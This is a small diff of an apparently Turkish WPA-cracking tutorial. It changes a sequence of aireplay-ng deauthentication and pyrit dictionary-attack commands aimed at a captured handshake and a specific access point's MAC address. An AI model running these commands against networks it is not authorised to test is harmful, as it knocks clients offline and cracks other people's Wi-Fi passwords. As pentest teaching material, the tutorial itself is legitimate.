@@ -172,8 +172,10 @@ modunda başlatmayı unutmayın.
 # aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F mon0 
 
 # pyrit -r wpapyrit.cap -i /pentest/passwords/john/password.lst -b 34:08:04:09:3D:38 attack_passthrough
-# pyrit -i /pentest/passwords/john/password.lst import_passwords 
 
+# pyrit eval
+# pyrit -i /pentest/passwords/john/password.lst import_passwords 
 # pyrit -e wifu create_essid
+# pyrit batch
 # pyrit -r wpapyrit.cap -b 34:08:04:09:3D:38 attack_db 
 
